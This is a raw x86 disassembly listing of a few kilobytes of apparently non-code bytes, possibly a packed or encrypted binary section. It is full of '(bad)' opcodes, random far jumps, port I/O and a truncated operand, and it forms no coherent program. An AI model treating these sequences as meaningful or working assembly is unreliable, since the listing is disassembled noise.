  41ae83:	std    
  41ae84:	sahf   
  41ae85:	adc    esi,DWORD PTR [ecx+0x25]
  41ae88:	pop    es
  41ae89:	sbb    eax,0x5d36ac4b
  41ae8e:	sub    ebp,DWORD PTR [ebx-0x38]
  41ae91:	mov    ebp,0x2f494d0c
  41ae96:	shl    BYTE PTR [edx+0x6f],cl
  41ae99:	mov    ds:0xab4c4dc2,al
  41ae9e:	shl    DWORD PTR [edx],1
  41aea0:	mov    ds:0xd6c53857,eax
  41aea5:	push   ebp
  41aea6:	int    0x6b
  41aea8:	mov    ds:0x42e9cd9c,eax
  41aead:	call   0x34ac7707
  41aeb2:	cs mov esp,0xdd4ac7dd
  41aeb8:	or     eax,0xbd416d0
  41aebd:	push   ds
  41aebe:	mov    al,ds:0xa96d78ff
  41aec3:	ret    0xc0ea
  41aec6:	aas    
  41aec7:	mov    bl,0xc0
  41aec9:	add    DWORD PTR [ecx+0x23],0xffffffa8
  41aecd:	leave  
  41aece:	into   
  41aecf:	and    DWORD PTR [edi-0x3d88f7bb],0xd4a3f892
  41aed9:	lea    eax,[eax]
  41aedb:	stc    
  41aedc:	shr    BYTE PTR [edi-0x5132b926],0x93
  41aee3:	pusha  
  41aee4:	outs   dx,BYTE PTR ds:[esi]
  41aee5:	cmp    eax,0x7ddb3bf4
  41aeea:	xchg   esp,eax
  41aeeb:	test   al,0x5d
  41aeed:	cmp    eax,0x72b1215a
  41aef2:	sbb    eax,0x96fd591f
  41aef7:	mul    BYTE PTR [edi]
  41aef9:	sub    al,0x1
  41aefb:	add    BYTE PTR [edx+edx*2],bh
  41aefe:	out    dx,eax
  41aeff:	cmp    eax,DWORD PTR [eax]
  41af01:	push   eax
  41af02:	es ret 0x2bdf
  41af06:	ins    DWORD PTR es:[edi],dx
  41af07:	pslld  mm7,QWORD PTR [ebp+edx*2-0x119127b2]
  41af0f:	xor    BYTE PTR [esp+ebx*8+0x14a3a410],ch
  41af16:	dec    ebx
  41af17:	fadd   DWORD PTR [esi+0x1b]
  41af1a:	in     al,0x1c
  41af1c:	scas   al,BYTE PTR es:[edi]
  41af1d:	cmovb  eax,DWORD PTR [ebp+eiz*4+0x17]
  41af22:	sbb    al,0x2a
  41af24:	cmp    eax,eax
  41af26:	dec    edx
  41af27:	lods   eax,DWORD PTR ds:[esi]
  41af28:	mov    eax,ds:0x2a21bbac
  41af2d:	in     eax,dx
  41af2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af2f:	jle    0x41af9a
  41af31:	cmp    BYTE PTR [esi],dl
  41af33:	mov    esp,0xa96d6f98
  41af38:	retf   0x5c29
  41af3b:	inc    ecx
  41af3c:	push   eax
  41af3d:	ss int3 
  41af3f:	(bad)  
  41af41:	cmp    ebp,edi
  41af43:	stos   DWORD PTR es:[edi],eax
  41af44:	data16 in al,dx
  41af46:	fsub   st,st(0)
  41af48:	mov    al,0xad
  41af4a:	jmp    0x1128674e
  41af4f:	mov    bh,BYTE PTR [edi-0x7e]
  41af52:	int3   
  41af53:	enter  0xc8af,0x3d
  41af57:	enter  0x15cb,0x6d
  41af5b:	popf   
  41af5c:	outs   dx,BYTE PTR ds:[esi]
  41af5d:	lds    edx,FWORD PTR [ecx]
  41af5f:	and    dh,BYTE PTR [esi+0x7be70163]
  41af65:	sub    ch,BYTE PTR [edi+ebp*8-0x286bfa73]
  41af6c:	std    
  41af6d:	xor    ch,BYTE PTR [esi+0x2e]
  41af70:	leave  
  41af71:	inc    esi
  41af72:	adc    BYTE PTR [esi],al
  41af74:	jae    0x41af89
  41af76:	mov    ch,0x79
  41af78:	js     0x41af2b
  41af7a:	push   ds
  41af7b:	inc    esi
  41af7c:	popa   
  41af7d:	fstp   QWORD PTR [ebx]
  41af7f:	pusha  
  41af80:	mov    DWORD PTR [ecx+0x55],edi
  41af83:	add    eax,0xee040e8a
  41af88:	sbb    eax,0x71ad6529
  41af8d:	or     DWORD PTR [edi+0x51],0xa24cec2e
  41af94:	pop    ebx
  41af95:	sahf   
  41af96:	push   0x27
  41af98:	sub    eax,0xbe95bb57
  41af9d:	into   
  41af9e:	or     edi,DWORD PTR [ebp+0x24392f7]
  41afa4:	jbe    0x41af85
  41afa6:	dec    ecx
  41afa7:	call   0x643b:0xca538060
  41afae:	dec    eax
  41afaf:	adc    BYTE PTR [eax+0x4b95cb72],bh
  41afb5:	leave  
  41afb6:	(bad)  
  41afb7:	enter  0x433b,0xeb
  41afbb:	jmp    0x2ec8f058
  41afc0:	push   ds
  41afc1:	std    
  41afc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41afc3:	fisub  DWORD PTR [edx-0x3be8ed77]
  41afc9:	pop    ebp
  41afca:	js     0x41af75
  41afcc:	xor    BYTE PTR [esp+ebp*8-0x1f3e022d],al
  41afd3:	pop    ebx
  41afd4:	dec    ebx
  41afd5:	hlt    
  41afd6:	mov    al,ds:0x41554d6a
  41afdb:	shr    DWORD PTR [edi],1
  41afdd:	mov    ds:0xaadfb03f,eax
  41afe2:	mov    esp,DWORD PTR [ecx+eax*1]
  41afe5:	stos   DWORD PTR es:[edi],eax
  41afe6:	dec    esp
  41afe7:	pop    ss
  41afe8:	or     ebx,edi
  41afea:	xchg   edi,eax
  41afeb:	push   ecx
  41afec:	add    ebx,DWORD PTR [ecx]
  41afee:	ins    BYTE PTR es:[edi],dx
  41afef:	sbb    ah,BYTE PTR [edi+0x4d]
  41aff2:	or     eax,0xba796287
  41aff7:	xlat   BYTE PTR ds:[ebx]
  41aff8:	dec    edi
  41aff9:	push   ecx
  41affa:	in     eax,dx
  41affb:	and    DWORD PTR [eax],ebx
  41affd:	dec    esp
  41affe:	or     al,0x80
  41b000:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b001:	pop    edx
  41b002:	fwait
  41b003:	cli    
  41b004:	sar    BYTE PTR [ebx+edi*2],0xd4
  41b008:	sub    BYTE PTR [eax-0x70],al
  41b00b:	cmc    
  41b00c:	push   es
  41b00d:	dec    esp
  41b00e:	repnz mov edx,0xbdce5e88
  41b014:	fmul   QWORD PTR [edi+0x0]
  41b017:	out    0xbd,al
  41b019:	inc    edx
  41b01a:	js     0x41afeb
  41b01c:	mov    WORD PTR [edi-0x753e50cf],ds
  41b022:	enter  0xaf41,0x16
  41b026:	or     eax,0xbbbb915a
  41b02b:	pushf  
  41b02c:	mul    DWORD PTR [ecx]
  41b02e:	push   esp
  41b02f:	sbb    BYTE PTR [ebp+0x56],bl
  41b032:	push   edx
  41b033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b034:	or     BYTE PTR [edi+eiz*1-0x6c873e3d],al
  41b03b:	mov    ebx,0x3c318d8f
  41b040:	mov    esi,0xa25aa0f5
  41b045:	loop   0x41b050
  41b047:	mov    dh,0xd5
  41b049:	rcl    BYTE PTR ss:[ebx+0x302a75c3],0xe3
  41b051:	adc    eax,0xf8a8624a
  41b056:	sahf   
  41b057:	or     ebp,DWORD PTR [ebx]
  41b059:	fstp   TBYTE PTR [ebx-0x21]
  41b05c:	int3   
  41b05d:	sub    eax,0xe01f319c
  41b062:	adc    edi,edi
  41b064:	stc    
  41b065:	push   ebp
  41b066:	into   
  41b067:	push   0x16
  41b069:	push   0x8ad02390
  41b06e:	retf   
  41b06f:	adc    BYTE PTR [ebp+0x643ceb1d],bl
  41b075:	dec    ebx
  41b076:	pusha  
  41b077:	cli    
  41b078:	mov    ch,0x7
  41b07a:	dec    edi
  41b07b:	xchg   DWORD PTR [edi-0x4],eax
  41b07e:	test   bh,al
  41b080:	pop    edi
  41b081:	int3   
  41b082:	dec    esp
  41b083:	enter  0xbc50,0xb7
  41b087:	mov    ebx,DWORD PTR [ebx+esi*4-0xb]
  41b08b:	mov    al,ds:0x44ab45a8
  41b090:	rcr    BYTE PTR [ebx+ecx*8+0x18],cl
  41b094:	test   BYTE PTR [ecx+eiz*8],cl
  41b097:	dec    eax
  41b098:	push   es
  41b099:	fstp   TBYTE PTR [ecx]
  41b09b:	ficom  WORD PTR [ebx-0x16c446c1]
  41b0a1:	ret    0xd667
  41b0a4:	adc    ebx,DWORD PTR [eax-0x3e5b795a]
  41b0aa:	mov    al,0x3f
  41b0ac:	cld    
  41b0ad:	pop    edi
  41b0ae:	mov    ch,0xc8
  41b0b0:	add    BYTE PTR [esi+eiz*2],al
  41b0b3:	mov    al,ds:0x9b67b386
  41b0b8:	mov    bh,0xb5
  41b0ba:	in     al,dx
  41b0bb:	lds    edx,FWORD PTR [ebx+0x25]
  41b0be:	stos   DWORD PTR es:[edi],eax
  41b0bf:	xchg   esi,eax
  41b0c0:	icebp  
  41b0c1:	pusha  
  41b0c2:	out    dx,al
  41b0c3:	push   edi
  41b0c4:	xchg   esi,eax
  41b0c5:	mov    esi,0x5f87923b
  41b0ca:	adc    BYTE PTR [ebx+0x65f052cf],dh
  41b0d0:	enter  0x653e,0x59
  41b0d4:	retf   
  41b0d5:	out    dx,al
  41b0d6:	mov    bl,0x68
  41b0d8:	add    DWORD PTR [eax-0x6d],esi
  41b0db:	push   es
  41b0dc:	stos   DWORD PTR es:[edi],eax
  41b0dd:	outs   dx,BYTE PTR ds:[esi]
  41b0de:	pusha  
  41b0df:	dec    ebp
  41b0e0:	lahf   
  41b0e1:	shl    BYTE PTR [esi+ebx*8+0x7f],cl
  41b0e5:	pusha  
  41b0e6:	retf   0x4b3c
  41b0e9:	in     eax,0x1b
  41b0eb:	pusha  
  41b0ec:	fsub   DWORD PTR [ecx+0x37]
  41b0ef:	jmp    0x3924:0x9a9e37da
  41b0f6:	push   cs
  41b0f7:	out    dx,eax
  41b0f8:	cmp    BYTE PTR [edi*4+0x4efa2798],ah
  41b0ff:	sub    esi,DWORD PTR [ebx]
  41b101:	nop
  41b102:	repz xchg esp,eax
  41b104:	xchg   edi,eax
  41b105:	push   ebx
  41b106:	sbb    DWORD PTR [eax+eax*2-0x56d5c9c5],edi
  41b10d:	sbb    al,0x36
  41b10f:	stc    
  41b110:	pop    es
  41b111:	pop    ebp
  41b112:	or     al,0x9a
  41b114:	(bad)  
  41b115:	jmp    0x413f0ea5
  41b11a:	pop    ecx
  41b11b:	sahf   
  41b11c:	aas    
  41b11d:	fsub   st,st(2)
  41b11f:	jmp    0x41b0b0
  41b121:	pop    edx
  41b122:	cs jmp 0x3cf2:0x3ae976c9
  41b12a:	mov    BYTE PTR [ebp+0x17],al
  41b12d:	mov    eax,ds:0x68547ffb
  41b132:	loop   0x41b141
  41b134:	inc    eax
  41b135:	rcl    BYTE PTR [ecx-0x8d223ca],0x47
  41b13c:	xchg   BYTE PTR [edi],al
  41b13e:	sbb    edi,DWORD PTR [esi-0x69]
  41b141:	adc    dh,al
  41b143:	sub    DWORD PTR [edi+0x332d7b77],edx
  41b149:	inc    ecx
  41b14a:	pop    ecx
  41b14b:	dec    eax
  41b14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b14d:	das    
  41b14e:	into   
  41b14f:	jmp    0x102393d7
  41b154:	sub    ecx,DWORD PTR [ebx+0xbc14b1d]
  41b15a:	mov    ecx,0x4a69b7fd
  41b15f:	inc    eax
  41b160:	mov    ch,0x64
  41b162:	xlat   BYTE PTR ds:[ebx]
  41b163:	push   ebp
  41b164:	jnp    0x41b190
  41b166:	in     eax,0x83
  41b168:	mov    al,ds:0xb9c3067e
  41b16d:	mov    dh,0x95
  41b16f:	call   0x3e7a:0x3800fa73
  41b176:	push   ebx
  41b177:	adc    al,0xb8
  41b179:	je     0x41b104
  41b17b:	xor    DWORD PTR [edx+0xd],edx
  41b17e:	cmp    DWORD PTR [esi],0x86d3b625
  41b184:	les    edi,FWORD PTR [esi+0x38]
  41b187:	jmp    0xe75a4563
  41b18c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b18d:	clc    
  41b18e:	jp     0x41b157
  41b190:	in     eax,0xe6
  41b192:	adc    BYTE PTR [eax*4+0x7f2d9714],bl
  41b199:	and    al,0xf3
  41b19b:	cdq    
  41b19c:	inc    esi
  41b19d:	test   eax,0x65e4343a
  41b1a2:	jae    0x41b1a2
  41b1a4:	imul   edi,DWORD PTR [edi+0x5ff2698d],0x74a121df
  41b1ae:	cmp    ah,BYTE PTR [ebx+0x50]
  41b1b1:	mov    ebp,0x44cd9f41
  41b1b6:	jo     0x41b1d3
  41b1b8:	and    eax,0x12e1930d
  41b1bd:	pop    eax
  41b1be:	rcl    DWORD PTR [ebx+0x52],cl
  41b1c1:	out    0x90,al
  41b1c3:	or     dl,BYTE PTR [esi+0x2e5ffedb]
  41b1c9:	rcr    DWORD PTR [ebp+0x7b],0xfd
  41b1cd:	sbb    bh,BYTE PTR [esi-0x6a]
  41b1d0:	or     dh,cl
  41b1d2:	and    edx,DWORD PTR [edx+eiz*1]
  41b1d5:	stc    
  41b1d6:	and    edi,DWORD PTR cs:[edx]
  41b1d9:	mov    ch,0xcb
  41b1db:	ds int 0x76
  41b1de:	aas    
  41b1df:	jmp    0xaaef:0xf73bb0c9
  41b1e6:	fnstcw WORD PTR fs:[ebp-0x75]
  41b1ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1eb:	in     al,0x93
  41b1ed:	or     cl,BYTE PTR [ecx+0x70187de4]
  41b1f3:	xor    DWORD PTR [edi],esp
  41b1f5:	adc    DWORD PTR [ebp*8-0x356ad34f],esp
  41b1fc:	adc    ebp,edx
  41b1fe:	aas    
  41b1ff:	sub    eax,0x191a5df2
  41b204:	ss pop esp
  41b206:	dec    esp
  41b207:	popf   
  41b208:	push   ecx
  41b209:	mov    edx,0xd83ea5ca
  41b20e:	sbb    eax,0x36330fb7
  41b213:	dec    esp
  41b214:	mov    edi,0xefa37656
  41b219:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b21a:	mov    bl,0x7c
  41b21c:	sub    ecx,esp
  41b21e:	xor    BYTE PTR [eax],0x94
  41b221:	(bad)  
  41b222:	jnp    0x41b26e
  41b224:	mov    ah,BYTE PTR [edi+0x53]
  41b227:	inc    edx
  41b228:	xchg   DWORD PTR [edx],ecx
  41b22a:	adc    al,0x3f
  41b22c:	add    cl,BYTE PTR [eax]
  41b22e:	inc    eax
  41b22f:	pop    edi
  41b230:	cdq    
  41b231:	mov    ds:0x40bc23b9,al
  41b236:	mov    esp,0x2c11ecc8
  41b23b:	sbb    ebx,DWORD PTR [ebx+0x7278a89d]
  41b241:	xchg   ebx,eax
  41b242:	jnp    0x41b293
  41b244:	jns    0x41b287
  41b246:	ins    BYTE PTR es:[edi],dx
  41b247:	mov    bl,0x1d
  41b249:	stc    
  41b24a:	push   ds
  41b24b:	jp     0x41b28e
  41b24d:	fdivr  QWORD PTR [edi+0x65a8c71b]
  41b253:	push   eax
  41b254:	imul   ebp,DWORD PTR [ebp+0xb],0x1cff894b
  41b25b:	sbb    eax,DWORD PTR [ebp+0x693dba8f]
  41b261:	cs scas al,BYTE PTR es:[edi]
  41b263:	adc    edx,ebp
  41b265:	xchg   edi,esi
  41b267:	push   es
  41b268:	fist   DWORD PTR [eax+eax*8+0x4c]
  41b26c:	lea    eax,[edx+0x4b]
  41b26f:	sar    BYTE PTR [edi+0x62],0x50
  41b273:	add    al,0x77
  41b275:	add    eax,0xf8dc8acc
  41b27a:	mov    ch,0xcc
  41b27c:	pop    edx
  41b27d:	sahf   
  41b27e:	test   eax,0xfd0845df
  41b283:	nop
  41b284:	call   0x5f17:0x8f399159
  41b28b:	inc    ecx
  41b28c:	ins    BYTE PTR es:[edi],dx
  41b28d:	bswap  ecx
  41b28f:	push   ecx
  41b290:	jne    0x41b2fa
  41b292:	xchg   DWORD PTR [edx-0x19],edx
  41b295:	inc    esp
  41b296:	fdivr  QWORD PTR [eax+0x65]
  41b299:	push   ebx
  41b29a:	mov    ch,0x25
  41b29c:	cmp    DWORD PTR [esi-0x49e4249c],ebx
  41b2a2:	into   
  41b2a3:	popf   
  41b2a4:	movlps QWORD PTR [ebx-0x1151a2d7],xmm3
  41b2ab:	in     al,0xa8
  41b2ad:	ds push ds
  41b2af:	adc    ch,ah
  41b2b1:	sbb    eax,0x16f94d57
  41b2b6:	cmp    DWORD PTR [edi],0xffffff98
  41b2b9:	jb     0x41b264
  41b2bb:	xor    BYTE PTR [eax],bh
  41b2bd:	jnp    0x41b2f4
  41b2bf:	pop    edi
  41b2c0:	cmp    edx,DWORD PTR [ecx+0x304ee84f]
  41b2c6:	and    dh,ah
  41b2c8:	dec    ecx
  41b2c9:	call   0x4a247532
  41b2ce:	jno    0x41b30c
  41b2d0:	fcomp  DWORD PTR [eax+0x3836f02f]
  41b2d6:	loopne 0x41b2f5
  41b2d8:	add    DWORD PTR [edx],esi
  41b2da:	mov    ebp,0x550fbc00
  41b2df:	push   0x53
  41b2e1:	in     al,dx
  41b2e2:	popa   
  41b2e3:	adc    eax,0x5359eaf7
  41b2e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2e9:	(bad)  
  41b2ea:	out    0x34,eax
  41b2ec:	sahf   
  41b2ed:	lea    edx,[esp+ecx*8-0x1e]
  41b2f1:	inc    esi
  41b2f2:	jnp    0x41b310
  41b2f4:	xchg   ecx,eax
  41b2f5:	pop    es
  41b2f6:	or     eax,0x9fbbf323
  41b2fb:	push   cs
  41b2fc:	xor    edx,0xddf658f5
  41b302:	push   0xd6ea781
  41b307:	mov    ch,0xc3
  41b309:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b30a:	sbb    eax,0x7febf33d
  41b30f:	jae    0x41b2e9
  41b311:	in     eax,0x6f
  41b313:	call   0x684c:0x16aee8a6
  41b31a:	mov    WORD PTR [edi],cs
  41b31c:	lock fucomi st,st(2)
  41b31f:	push   edx
  41b320:	jmp    0x2f922416
  41b325:	jge    0x41b2fd
  41b327:	pop    ebp
  41b328:	bound  esp,QWORD PTR [esi]
  41b32a:	push   ecx
  41b32b:	sub    ebx,esp
  41b32d:	lea    ebx,[ebx-0x3a9bfae8]
  41b333:	cmp    al,BYTE PTR [ecx+0x7f]
  41b336:	rcl    DWORD PTR [eax+0x5b0ed140],cl
  41b33c:	mov    al,ds:0xf91783f4
  41b341:	hlt    
  41b342:	outs   dx,BYTE PTR ds:[esi]
  41b343:	(bad)  
  41b344:	jae    0x41b31e
  41b346:	daa    
  41b347:	sahf   
  41b348:	scas   al,BYTE PTR es:[edi]
  41b349:	push   ebx
  41b34a:	into   
  41b34b:	cmp    bh,0xa1
  41b34e:	in     eax,dx
  41b34f:	test   al,0x5a
  41b351:	push   edi
  41b352:	lahf   
  41b353:	scas   eax,DWORD PTR es:[edi]
  41b354:	adc    al,0x90
  41b356:	push   ds
  41b357:	lods   eax,DWORD PTR ds:[esi]
  41b358:	dec    esp
  41b359:	imul   ebx
  41b35b:	mov    cl,0xfc
  41b35d:	in     al,0x77
  41b35f:	test   BYTE PTR [esi-0xa1ed74d],ah
  41b365:	inc    eax
  41b366:	cmp    eax,0xab6439e7
  41b36b:	sahf   
  41b36c:	cmp    eax,0xbce56f0f
  41b371:	in     eax,dx
  41b372:	je     0x41b32d
  41b374:	ins    BYTE PTR es:[edi],dx
  41b375:	xchg   ebp,eax
  41b376:	xchg   ebp,eax
  41b377:	xor    eax,0x3a4246eb
  41b37c:	(bad)  
  41b37d:	ss mov ebx,0xcf326aee
  41b383:	mov    edx,ds
  41b385:	jg     0x41b354
  41b387:	repz call 0x3b69bc44
  41b38d:	xlat   BYTE PTR ds:[ebx]
  41b38e:	ficomp WORD PTR [edi]
  41b390:	mov    DWORD PTR ds:0xa08d9984,0xe78e8079
  41b39a:	sub    eax,0x85ec2a4b
  41b39f:	sbb    DWORD PTR [ebx+0x62],eax
  41b3a2:	push   cs
  41b3a3:	leave  
  41b3a4:	pop    es
  41b3a5:	repnz sub DWORD PTR [ecx-0x2284efc3],eax
  41b3ac:	or     BYTE PTR [ebp+0x5163060a],dh
  41b3b2:	ds addr16 xchg edx,eax
  41b3b5:	aam    0x10
  41b3b7:	pop    ecx
  41b3b8:	or     al,0x5c
  41b3ba:	(bad)  [edi+0xb]
  41b3bd:	ror    BYTE PTR [edi],cl
  41b3bf:	and    ebx,DWORD PTR [ebx+0x2c]
  41b3c2:	xor    DWORD PTR [eax],ecx
  41b3c4:	gs iret 
  41b3c6:	dec    eax
  41b3c7:	xchg   ecx,eax
  41b3c8:	out    dx,eax
  41b3c9:	call   0xcbb7:0x4c787a74
  41b3d0:	mov    edi,0xa9a0e6e8
  41b3d5:	sbb    DWORD PTR [edx-0x2afad5ae],ebp
  41b3db:	xchg   ebp,eax
  41b3dc:	(bad)  
  41b3dd:	stos   DWORD PTR es:[edi],eax
  41b3de:	jmp    0x97156edd
  41b3e3:	dec    eax
  41b3e4:	pop    ebx
  41b3e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b3e6:	inc    DWORD PTR [esi+0x547be3ff]
  41b3ec:	xchg   ebx,eax
  41b3ed:	add    BYTE PTR [ecx+0x22],al
  41b3f0:	dec    esi
  41b3f1:	push   ss
  41b3f2:	test   al,0x7c
  41b3f4:	and    bl,BYTE PTR [eax]
  41b3f6:	lahf   
  41b3f7:	sbb    DWORD PTR [edi+0x3f652a0c],eax
  41b3fd:	push   ecx
  41b3fe:	jp     0x41b444
  41b400:	leave  
  41b401:	fild   DWORD PTR [ebx+0xa]
  41b404:	push   0x72
  41b406:	or     edi,DWORD PTR [ebp-0x1]
  41b409:	mov    ah,0xf9
  41b40b:	outs   dx,DWORD PTR ds:[esi]
  41b40c:	(bad)  
  41b40d:	int3   
  41b40e:	loopne 0x41b42c
  41b410:	push   esi
  41b411:	out    dx,al
  41b412:	sub    eax,0x4c061266
  41b417:	ror    DWORD PTR [ecx-0x205bd671],1
  41b41d:	jmp    0x41b45e
  41b41f:	cmp    bh,BYTE PTR [edi]
  41b421:	outs   dx,BYTE PTR ds:[esi]
  41b422:	(bad)  
  41b423:	outs   dx,BYTE PTR ds:[esi]
  41b424:	mov    bh,0xb
  41b426:	dec    esi
  41b427:	dec    edx
  41b428:	lahf   
  41b429:	inc    edx
  41b42a:	adc    BYTE PTR [ecx+0x25188993],bl
  41b430:	sbb    bl,BYTE PTR [eax-0x45f61ed3]
  41b436:	fwait
  41b437:	push   edx
  41b438:	sti    
  41b439:	xor    dh,dh
  41b43b:	loopne 0x41b42d
  41b43d:	(bad)  
  41b43e:	pop    edx
  41b43f:	fisttp DWORD PTR [ecx+0x3f]
  41b442:	in     eax,dx
  41b443:	shl    DWORD PTR [ebx],1
  41b445:	inc    edi
  41b446:	lds    esp,FWORD PTR [edx+0x5b340465]
  41b44c:	mov    esi,DWORD PTR [edx+edx*1]
  41b44f:	add    al,0x3c
  41b451:	and    eax,0xc9bdc146
  41b456:	(bad)  
  41b458:	sti    
  41b459:	cdq    
  41b45a:	mov    edi,0x5b022c1
  41b45f:	sub    DWORD PTR [esi-0x1c71f4f],ebp
  41b465:	test   DWORD PTR [esi],0xb5c6c158
  41b46b:	out    0xe9,eax
  41b46d:	sub    BYTE PTR [ebx+eiz*2],bl
  41b470:	add    BYTE PTR [ebp*1-0x596f536d],cl
  41b477:	xlat   BYTE PTR ds:[ebx]
  41b478:	ret    0xdbac
  41b47b:	or     dh,BYTE PTR [ecx]
  41b47d:	or     DWORD PTR [ebp+edi*8+0x22b5e86d],ebx
  41b484:	add    eax,0x351b0cea
  41b489:	inc    esp
  41b48a:	sbb    al,0xb8
  41b48c:	jmp    0x4fec:0xa9268aff
  41b493:	daa    
  41b494:	pop    ds
  41b495:	data16 std 
  41b497:	sub    DWORD PTR [ecx],ebx
  41b499:	leave  
  41b49a:	in     eax,0x2e
  41b49c:	sub    ecx,DWORD PTR [esi+0x2c420e7d]
  41b4a2:	adc    al,0xec
  41b4a4:	jb     0x41b51c
  41b4a6:	fwait
  41b4a7:	(bad)  
  41b4a8:	in     al,0x15
  41b4aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b4ab:	adc    ch,BYTE PTR [ecx]
  41b4ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4ae:	nop
  41b4af:	jp     0x41b475
  41b4b1:	push   cs
  41b4b2:	push   0xfffffffa
  41b4b4:	pop    eax
  41b4b5:	sub    ebx,DWORD PTR [eax]
  41b4b7:	mov    al,ds:0x1817dbb0
  41b4bc:	pop    ds
  41b4bd:	push   esi
  41b4be:	xor    al,0x57
  41b4c0:	jl     0x41b4ca
  41b4c2:	shl    BYTE PTR [edi+eiz*8+0x5f7baae7],1
  41b4c9:	or     BYTE PTR [ebx-0x1cbaece5],al
  41b4cf:	jno    0x41b537
  41b4d1:	out    0x81,eax
  41b4d3:	inc    eax
  41b4d4:	jl     0x41b51f
  41b4d6:	ficom  WORD PTR [edi-0x65]
  41b4d9:	push   ecx
  41b4da:	shl    cl,1
  41b4dc:	hlt    
  41b4dd:	add    ah,BYTE PTR [esi+0x60]
  41b4e0:	adc    DWORD PTR [ecx],eax
  41b4e2:	mov    bl,0x10
  41b4e4:	mov    dl,0xac
  41b4e6:	sub    al,0x23
  41b4e8:	popa   
  41b4e9:	ret    
  41b4ea:	mov    ch,cl
  41b4ec:	mov    dl,cl
  41b4ee:	lahf   
  41b4ef:	mov    dl,0x87
  41b4f1:	mov    DWORD PTR [ebx],esp
  41b4f3:	arpl   WORD PTR [ebx-0x38],bp
  41b4f6:	pop    es
  41b4f7:	jl     0x41b496
  41b4f9:	push   esp
  41b4fa:	push   ss
  41b4fb:	fs pop ss
  41b4fd:	out    0x7e,eax
  41b4ff:	cli    
  41b500:	jle    0x41b4c4
  41b502:	mov    ds:0x441e192c,eax
  41b507:	(bad)  
  41b508:	fwait
  41b509:	sbb    al,0x8
  41b50b:	ja     0x41b51a
  41b50d:	push   ds
  41b50e:	adc    ebx,ecx
  41b510:	mov    ebx,0x2207d03d
  41b515:	jbe    0x41b541
  41b517:	punpcklbw mm0,DWORD PTR [ecx+0x7d24838]
  41b51e:	or     al,0x63
  41b520:	sbb    bh,0x94
  41b523:	cmp    cl,BYTE PTR [esi-0x59]
  41b526:	add    eax,ebx
  41b528:	fsqrt  
  41b52a:	push   esp
  41b52b:	imul   edi,ebx,0x14
  41b52e:	push   ds
  41b52f:	and    ebp,edx
  41b531:	push   edx
  41b532:	daa    
  41b533:	enter  0xf301,0x2f
  41b537:	add    BYTE PTR [esp+eax*1+0x77],cl
  41b53b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b53c:	(bad)  
  41b53d:	(bad)  
  41b53e:	jp     0x41b578
  41b540:	mov    dl,0xe2
  41b542:	push   ebp
  41b543:	cmc    
  41b544:	jo     0x41b526
  41b546:	test   DWORD PTR [eax+0x22b4b7b3],edi
  41b54c:	test   DWORD PTR [edx-0x5f1f3fba],esp
  41b552:	sbb    DWORD PTR [edi],esi
  41b554:	les    edx,FWORD PTR [edx]
  41b556:	stos   BYTE PTR es:[edi],al
  41b557:	out    dx,eax
  41b558:	cmp    DWORD PTR [esi],eax
  41b55a:	sbb    eax,DWORD PTR [eax-0x5e84f421]
  41b560:	in     eax,dx
  41b561:	adc    edx,ebp
  41b563:	clc    
  41b564:	jmp    0xcd7f:0x866c8463
  41b56b:	and    eax,0xe935c5e7
  41b570:	add    cl,BYTE PTR [ebx]
  41b572:	add    eax,0x1d15e149
  41b577:	pop    ss
  41b578:	pop    ss
  41b579:	pop    edx
  41b57a:	ds popf 
  41b57c:	cdq    
  41b57d:	fcomp  QWORD PTR [ecx]
  41b57f:	cmp    bl,BYTE PTR [edi]
  41b581:	cmp    al,0xb8
  41b583:	mov    dh,al
  41b585:	scas   eax,DWORD PTR es:[edi]
  41b586:	ins    DWORD PTR es:[edi],dx
  41b587:	mov    al,ds:0xa2a95b1d
  41b58c:	(bad)  
  41b58d:	(bad)  
  41b58e:	repz hlt 
  41b590:	rol    DWORD PTR [eax-0x7d72d6ef],cl
  41b596:	pop    ss
  41b597:	sub    BYTE PTR [eax-0x72],bl
  41b59a:	(bad)  
  41b59b:	int3   
  41b59c:	add    cl,BYTE PTR ds:0xfa29aaed
  41b5a2:	imul   esp,DWORD PTR [ebp+0xb0f71d2],0xfffffff5
  41b5a9:	cli    
  41b5aa:	push   eax
  41b5ab:	call   0x83e5:0x282b4b06
  41b5b2:	inc    ecx
  41b5b3:	(bad)  
  41b5b4:	into   
  41b5b5:	test   eax,0xf6fd0918
  41b5ba:	iret   
  41b5bb:	fisttp DWORD PTR [edi+ebx*8]
  41b5be:	jbe    0x41b5c8
  41b5c0:	mov    eax,ds:0x7429dc24
  41b5c5:	scas   eax,DWORD PTR es:[edi]
  41b5c6:	out    dx,eax
  41b5c7:	sub    edx,DWORD PTR [edi-0x6e]
  41b5ca:	sbb    ecx,DWORD PTR [edi]
  41b5cc:	adc    BYTE PTR ss:[edx-0x10965de0],0x9e
  41b5d4:	jp     0x41b5d3
  41b5d6:	(bad)  
  41b5d7:	jmp    0x11f14966
  41b5dc:	xchg   esp,eax
  41b5dd:	add    DWORD PTR [edi+0x58],eax
  41b5e0:	mov    bl,dl
  41b5e2:	popf   
  41b5e3:	jle    0x41b600
  41b5e5:	lods   eax,DWORD PTR ds:[esi]
  41b5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b5e7:	cmc    
  41b5e8:	sahf   
  41b5e9:	add    al,0xcb
  41b5eb:	mov    edi,0x16eeaede
  41b5f0:	xchg   edx,eax
  41b5f1:	dec    edx
  41b5f2:	mov    WORD PTR [edx-0x31],?
  41b5f5:	mov    ecx,0xcf89c8d5
  41b5fa:	imul   edx,DWORD PTR [esp+ecx*1-0x2e2a3aa],0x4d
  41b602:	jno    0x41b62f
